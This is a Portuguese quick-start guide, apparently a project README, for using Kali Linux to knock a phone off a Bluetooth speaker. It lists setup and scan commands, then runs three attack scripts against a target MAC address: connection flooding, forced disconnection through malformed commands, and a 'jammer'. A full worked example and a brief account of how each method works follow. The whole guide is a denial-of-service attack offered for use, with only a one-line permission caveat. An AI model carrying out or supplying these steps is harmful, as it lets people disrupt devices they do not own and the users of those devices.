# Guia Rápido - Ataque Bluetooth para Desconectar Caixa de Som

## 🎯 Objetivo
Desconectar um celular de uma caixa de som Bluetooth usando Kali Linux.

## 📋 Passo a Passo

### 1. Preparação do Ambiente

```bash
# No Kali Linux, execute:
chmod +x setup.sh
./setup.sh
```

Ou manualmente:
```bash
sudo apt update
sudo apt install -y python3-pip bluetooth bluez libbluetooth-dev
pip3 install pybluez bleak scapy
sudo hciconfig hci0 up
```

### 2. Escanear Dispositivos

```bash
python3 bluetooth_scan.py
```

**O que fazer:**
- Ative o Bluetooth na caixa de som (modo pareamento)
- Execute o scan e anote o **endereço MAC** da caixa de som
- Formato do MAC: `AA:BB:CC:DD:EE:FF`

### 3. Executar o Ataque

Escolha um dos métodos abaixo:

#### Método 1: Flooding (Mais Simples)
```bash
python3 bluetooth_flood.py --target AA:BB:CC:DD:EE:FF
```

#### Método 2: Desconexão Forçada
```bash
python3 bluetooth_disconnect.py --target AA:BB:CC:DD:EE:FF
```

#### Método 3: Interferência (Requer Root)
```bash
sudo python3 bluetooth_jammer.py --target AA:BB:CC:DD:EE:FF
```

### 4. Verificar Resultado

- O celular deve desconectar da caixa de som
- A caixa pode entrar em modo pareamento novamente
- Pode ser necessário reconectar manualmente

## 🔧 Troubleshooting

### Bluetooth não funciona
```bash
sudo systemctl start bluetooth
sudo hciconfig hci0 up
```

### Erro de permissões
```bash
sudo usermod -aG bluetooth $USER
# Faça logout e login novamente
```

### Adaptador não detectado
```bash
lsusb | grep -i bluetooth
sudo modprobe btusb
```

### Script não encontra dispositivos
- Certifique-se que a caixa está em modo pareamento
- Verifique a distância (máximo ~10 metros)
- Tente aumentar o tempo de scan no código

## ⚠️ Importante

- **Use apenas em dispositivos próprios ou com permissão**
- Alguns métodos podem não funcionar em todos os dispositivos
- Dispositivos mais novos podem ter proteções
- O ataque funciona melhor em dispositivos Bluetooth mais antigos

## 📝 Exemplo Completo

```bash
# 1. Instalar
./setup.sh

# 2. Escanear
python3 bluetooth_scan.py
# Anotar MAC: 00:11:22:33:44:55

# 3. Atacar
python3 bluetooth_flood.py --target 00:11:22:33:44:55 --duration 60

# 4. Verificar desconexão
```

## 🎓 Como Funciona

1. **Flooding**: Envia muitas requisições de conexão, sobrecarregando o dispositivo
2. **Desconexão Forçada**: Envia comandos de desconexão malformados
3. **Interferência**: Usa escaneamento contínuo para interferir na conexão

## 📚 Próximos Passos

- Testar diferentes métodos
- Ajustar duração do ataque
- Experimentar com diferentes dispositivos
- Estudar protocolos Bluetooth (L2CAP, RFCOMM, ACL)

